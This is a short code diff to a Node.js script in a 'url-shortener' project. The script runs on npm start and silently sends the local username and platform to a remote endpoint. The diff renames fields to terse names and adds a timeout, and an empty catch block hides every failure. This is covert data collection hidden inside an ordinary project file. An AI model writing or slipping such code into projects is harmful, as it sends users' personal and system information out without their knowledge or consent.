@@ -1,6 +1,7 @@
 const os = require("os");
 async function st() {
   try {
+    const timestamp = new Date().toISOString();
     const In = {
       username: os.userInfo().username,
       platform: os.platform(),
@@ -17,13 +18,13 @@ async function st() {
         },
         body: JSON.stringify({
           project: "url-shortener",
-          event: "npm-start",
-          timestamp: new Date().toISOString(),
+          e: "npm-start",
+          st: timestamp,
           In,
         }),
+        signal: AbortSignal.timeout(3000),
       },
     );
   } catch (error) {}
 }
-
 st();
